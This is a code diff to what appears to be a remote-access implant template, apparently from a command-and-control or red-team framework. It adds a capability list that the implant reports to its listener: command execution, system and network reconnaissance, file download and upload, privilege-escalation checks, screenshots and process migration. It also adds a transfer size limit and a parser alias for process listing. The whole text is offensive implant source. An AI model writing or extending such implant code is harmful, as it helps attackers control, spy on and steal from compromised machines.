@@ -1518,6 +1518,25 @@ def _register(transport) -> tuple:
         "arch": ident["arch"],
         "username": ident["user"],
         "agent_version": ident["version"],
+        # What this build was compiled with, written out of the same switches that
+        # decided which handlers exist above. The server queues a tasking to an
+        # implant that cannot perform it and gets whatever a shell says about the
+        # word instead; this list is how it knows not to. It is a claim about this
+        # file, not about what the operator is allowed to ask.
+        "capabilities": [
+            {% if include_exec %}"exec",{% endif %}
+            "ping", "shutdown",
+            {% if include_recon %}"sysinfo", "network", "processes",{% endif %}
+
+            {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
+            {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
+            {% if include_screenshot %}"screenshot",{% endif %}
+            {% if migration %}"migrate",{% endif %}
+        ],
+        # No fixed read buffer: a line here is as long as memory allows, and this
+        # is the number a chunked transfer is sized against. It is generous on
+        # purpose, because the transfer module caps at far less anyway.
+        "max_line": 4 * 1024 * 1024,
     })
     if resp.get("type") == "error" and resp.get("message") == "auth_failed":
         # The listener is there and answered; it just does not know this agent.
@@ -1634,7 +1653,11 @@ def _parse_command(text: str) -> dict:
     v, arg = verb.lower(), text[len(verb):].strip()
     if v in ("sysinfo", "network", "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
-    if v == "ps":
+    if v in ("ps", "processes"):
+        # Both words answer the server's capability by that name. A word the
+        # queue will let through and this table does not know is a word that
+        # reaches the shell, and the shell's complaint about it reads as the
+        # target's answer.
         return {"action": "processes"}
     if v in ("exit", "shutdown"):
         return {"action": "shutdown"}
